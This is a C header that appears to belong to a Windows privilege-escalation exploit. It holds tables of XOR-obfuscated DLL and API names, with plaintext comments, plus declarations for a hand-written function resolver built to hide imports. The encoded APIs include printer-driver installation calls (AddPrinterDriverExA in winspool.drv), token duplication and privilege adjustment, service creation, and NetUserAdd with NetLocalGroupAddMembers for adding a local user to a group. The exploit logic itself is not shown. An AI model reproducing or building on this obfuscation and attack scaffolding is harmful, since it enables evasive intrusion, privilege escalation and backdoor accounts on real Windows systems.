#pragma once

#include "WinAPIDefines.h"
#include "StringCrypt.h"
#include <winternl.h>

#pragma warning(disable:4430)

typedef struct _DynamicModule {
	void*	pModule;
} DynamicModule, *PDynamicModule;

typedef struct _DynamicFunction {
	void*			pFunction;
} DynamicFunction, *PDynamicFunction;

typedef enum ModuleEntry {
	_Kernel32,
	_Ntdll,
	_WinSpool,
	_Advapi,
	//_Wtsapi32,
	_Netapi32,
	ModuleEntryLen
} ModuleEntry;

static BYTE p_ModuleTable[ModuleEntry::ModuleEntryLen][20] = {
	{0xc4,0xca,0xdd,0xc1,0xca,0xc3,0x9c,0x9d,0x81,0xcb,0xc3,0xc3,0},	//kernel32.dll
	{0xc1,0xdb,0xcb,0xc3,0xc3,0x81,0xcb,0xc3,0xc3,0},					//ntdll.dll
	{0xd8,0xc6,0xc1,0xdc,0xdf,0xc0,0xc0,0xc3,0x81,0xcb,0xdd,0xd9,0},	//winspool.drv
	{0xce,0xcb,0xd9,0xce,0xdf,0xc6,0x9c,0x9d,0x81,0xcb,0xc3,0xc3,0},	//advapi.dll
	//{0xf8,0xdb,0xdc,0xce,0xdf,0xc6,0x9c,0x9d,0x81,0xcb,0xc3,0xc3,0}		//Wtsapi32.dll
	{0xe1,0xca,0xdb,0xce,0xdf,0xc6,0x9c,0x9d,0x81,0xcb,0xc3,0xc3,0}		//Netapi32.dll
};

static DynamicModule ModuleTable[ModuleEntryLen] = { 0 };

typedef enum FunctionEntry {
	_AddPrinterDriverExA,
	_CreateFileA,
	_GetCurrentDirectoryA,
	_GetProcessHeap,
	_GetTempPathA,
	_GetFileSize,
	_HeapAlloc,
	_HeapFree,
	_WriteFile,
	_ReadFile,
	_LoadLibraryA,
	_GetProcAddress,
	_CloseHandle,
	_EnumPrinterDriversA,
	_DeleteFileA,
	_FindResourceA,
	_LoadResource,
	_LockResource,
	_SizeOfResource,
	_GetModuleHandleA,
	_GetTickCount,
	_RegOpenKeyA,
	_RegQueryValueExA,
	_AdjustTokenPrivileges,
	_OpenProcessToken,
	_LookupPrivilegeValueA,
	_GetCurrentProcess,
	_PrivilegeCheck,
	_CreateServiceA,
	_OpenSCManagerA,
	_CloseServiceHandle,
	_GetWindowsDirectoryA,
	_OpenServiceA,
	_StartServiceA,
	_GetCurrentProcessId,
	_OpenProcess,
	_GetTokenInformation,
	_GetCurrentProcessToken,
	_DuplicateToken,
	_LogonUserA,
	_DuplicateTokenEx,
	_NetUserAdd,
	_NetLocalGroupAddMembers,
	FuncEntryLen
} FunctionEntry;

static DynamicFunction FunctionTable[FuncEntryLen] = { 0 };

static BYTE p_FunctionTable[FunctionEntry::FuncEntryLen][CRYPT_BUFF_LEN] = {
	{0xee,0xcb,0xcb,0xff,0xdd,0xc6,0xc1,0xdb,0xca,0xdd,0xeb,0xdd,0xc6,0xd9,0xca,0xdd,0xea,0xd7,0xee,0},//AddPrinterDriverExA
	{0xec,0xdd,0xca,0xce,0xdb,0xca,0xe9,0xc6,0xc3,0xca,0xee,0}, //CreateFileA
	{0xe8,0xca,0xdb,0xec,0xda,0xdd,0xdd,0xca,0xc1,0xdb,0xeb,0xc6,0xdd,0xca,0xcc,0xdb,0xc0,0xdd,0xd6,0xee,0}, //GetCurrentDirectoryA
	{0xe8,0xca,0xdb,0xff,0xdd,0xc0,0xcc,0xca,0xdc,0xdc,0xe7,0xca,0xce,0xdf,0},//GetProcessHeap
	{0xe8,0xca,0xdb,0xfb,0xca,0xc2,0xdf,0xff,0xce,0xdb,0xc7,0xee,0},//GetTempPathA
	{0xe8,0xca,0xdb,0xe9,0xc6,0xc3,0xca,0xfc,0xc6,0xd5,0xca,0},//GetFileSize
	{0xe7,0xca,0xce,0xdf,0xee,0xc3,0xc3,0xc0,0xcc,0},//HeapAlloc
	{0xe7,0xca,0xce,0xdf,0xe9,0xdd,0xca,0xca,0},//HeapFree
	{0xf8,0xdd,0xc6,0xdb,0xca,0xe9,0xc6,0xc3,0xca,0},//WriteFile
	{0xfd,0xca,0xce,0xcb,0xe9,0xc6,0xc3,0xca,0},//ReadFile
	{0xe3,0xc0,0xce,0xcb,0xe3,0xc6,0xcd,0xdd,0xce,0xdd,0xd6,0xee,0},//LoadLibraryA
	{0xe8,0xca,0xdb,0xff,0xdd,0xc0,0xcc,0xee,0xcb,0xcb,0xdd,0xca,0xdc,0xdc,0},//GetProcAddress
	{0xec,0xc3,0xc0,0xdc,0xca,0xe7,0xce,0xc1,0xcb,0xc3,0xca,0},//CloseHandle
	{0xea,0xc1,0xda,0xc2,0xff,0xdd,0xc6,0xc1,0xdb,0xca,0xdd,0xeb,0xdd,0xc6,0xd9,0xca,0xdd,0xdc,0xee,0},//EnumPrinterDriversA
	{0xeb,0xca,0xc3,0xca,0xdb,0xca,0xe9,0xc6,0xc3,0xca,0xee,0},//DeleteFileA
	{0xe9,0xc6,0xc1,0xcb,0xfd,0xca,0xdc,0xc0,0xda,0xdd,0xcc,0xca,0xee,0},//FindResourceA
	{0xe3,0xc0,0xce,0xcb,0xfd,0xca,0xdc,0xc0,0xda,0xdd,0xcc,0xca,0},//LoadResource
	{0xe3,0xc0,0xcc,0xc4,0xfd,0xca,0xdc,0xc0,0xda,0xdd,0xcc,0xca,0},//LockResource
	{0xfc,0xc6,0xd5,0xca,0xc0,0xc9,0xfd,0xca,0xdc,0xc0,0xda,0xdd,0xcc,0xca,0},//SizeOfResource
	{0xe8,0xca,0xdb,0xe2,0xc0,0xcb,0xda,0xc3,0xca,0xe7,0xce,0xc1,0xcb,0xc3,0xca,0xee,0},//GetModuleHandleA
	{0xe8,0xca,0xdb,0xfb,0xc6,0xcc,0xc4,0xec,0xc0,0xda,0xc1,0xdb,0},//GetTickCount
	{0xfd,0xca,0xc8,0xe0,0xdf,0xca,0xc1,0xe4,0xca,0xd6,0xee,0},//RegOpenKeyA
	{0xfd,0xca,0xc8,0xfe,0xda,0xca,0xdd,0xd6,0xf9,0xce,0xc3,0xda,0xca,0xea,0xd7,0xee,0},//RegQueryValueExA
	{0xee,0xcb,0xc5,0xda,0xdc,0xdb,0xfb,0xc0,0xc4,0xca,0xc1,0xff,0xdd,0xc6,0xd9,0xc6,0xc3,0xca,0xc8,0xca,0xdc,0},//AdjustTokenPrivileges
	{0xe0,0xdf,0xca,0xc1,0xff,0xdd,0xc0,0xcc,0xca,0xdc,0xdc,0xfb,0xc0,0xc4,0xca,0xc1,0},//OpenProcessToken
	{0xe3,0xc0,0xc0,0xc4,0xda,0xdf,0xff,0xdd,0xc6,0xd9,0xc6,0xc3,0xca,0xc8,0xca,0xf9,0xce,0xc3,0xda,0xca,0xee,0},//LookupPrivilegeValueA
	{0xe8,0xca,0xdb,0xec,0xda,0xdd,0xdd,0xca,0xc1,0xdb,0xff,0xdd,0xc0,0xcc,0xca,0xdc,0xdc,0},//GetCurrentProcess
	{0xff,0xdd,0xc6,0xd9,0xc6,0xc3,0xca,0xc8,0xca,0xec,0xc7,0xca,0xcc,0xc4,0},//PrivilegeCheck
	{0xec,0xdd,0xca,0xce,0xdb,0xca,0xfc,0xca,0xdd,0xd9,0xc6,0xcc,0xca,0xee,0},//CreateServiceA
	{0xe0,0xdf,0xca,0xc1,0xfc,0xec,0xe2,0xce,0xc1,0xce,0xc8,0xca,0xdd,0xee,0},//OpenSCManagerA
	{0xec,0xc3,0xc0,0xdc,0xca,0xfc,0xca,0xdd,0xd9,0xc6,0xcc,0xca,0xe7,0xce,0xc1,0xcb,0xc3,0xca,0},//CloseServiceHandle
	{0xe8,0xca,0xdb,0xf8,0xc6,0xc1,0xcb,0xc0,0xd8,0xdc,0xeb,0xc6,0xdd,0xca,0xcc,0xdb,0xc0,0xdd,0xd6,0xee,0},//GetWindowsDirectoryA
	{0xe0,0xdf,0xca,0xc1,0xfc,0xca,0xdd,0xd9,0xc6,0xcc,0xca,0xee,0},//OpenServiceA
	{0xfc,0xdb,0xce,0xdd,0xdb,0xfc,0xca,0xdd,0xd9,0xc6,0xcc,0xca,0xee,0}, //StartServiceA
	{0xe8,0xca,0xdb,0xec,0xda,0xdd,0xdd,0xca,0xc1,0xdb,0xff,0xdd,0xc0,0xcc,0xca,0xdc,0xdc,0xe6,0xcb,0}, // GetCurrentProcessId
	{0xe0,0xdf,0xca,0xc1,0xff,0xdd,0xc0,0xcc,0xca,0xdc,0xdc,0}, //OpenProcess
	{0xe8,0xca,0xdb,0xfb,0xc0,0xc4,0xca,0xc1,0xe6,0xc1,0xc9,0xc0,0xdd,0xc2,0xce,0xdb,0xc6,0xc0,0xc1,0}, //GetTokenInformation
	{0xe8,0xca,0xdb,0xec,0xda,0xdd,0xdd,0xca,0xc1,0xdb,0xff,0xdd,0xc0,0xcc,0xca,0xdc,0xdc,0xfb,0xc0,0xc4,0xca,0xc1,0}, //GetCurrentProcessToken
	{0xeb,0xda,0xdf,0xc3,0xc6,0xcc,0xce,0xdb,0xca,0xfb,0xc0,0xc4,0xca,0xc1,0},//DuplicateToken
	{0xe3,0xc0,0xc8,0xc0,0xc1,0xfa,0xdc,0xca,0xdd,0xee,0},//LogonUserA
	{0xeb,0xda,0xdf,0xc3,0xc6,0xcc,0xce,0xdb,0xca,0xfb,0xc0,0xc4,0xca,0xc1,0xea,0xd7,0}, //DuplicateTokenEx
	{0xe1,0xca,0xdb,0xfa,0xdc,0xca,0xdd,0xee,0xcb,0xcb,0},//NetUserAdd
	{0xe1,0xca,0xdb,0xe3,0xc0,0xcc,0xce,0xc3,0xe8,0xdd,0xc0,0xda,0xdf,0xee,0xcb,0xcb,0xe2,0xca,0xc2,0xcd,0xca,0xdd,0xdc,0}//NetLocalGroupAddMembers
};

static fp_GetProcAddress _fGetProcAddress;
static fp_LoadLibraryA _fLoadLibraryA;

// https://www.nirsoft.net/kernel_struct/vista/LDR_DATA_TABLE_ENTRY.html
typedef struct _LDR_DATA_TABLE_ENTRY_COMPLETED
{
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    //rest is not used
} LDR_DATA_TABLE_ENTRY_COMPLETED, * PLDR_DATA_TABLE_ENTRY_COMPLETED;

BOOL InitFuncResolver();
void* ResolveModuleFunction(char* module, char* functionName);
void* myGetModuleHandleW(WCHAR* module_name);
void* myGetProcAddress(char* module, char* search_name);
DWORD mbyte_2_wchar(char* p_mbyte, DWORD cbByte, WCHAR* p_wchar, DWORD cbWchar);
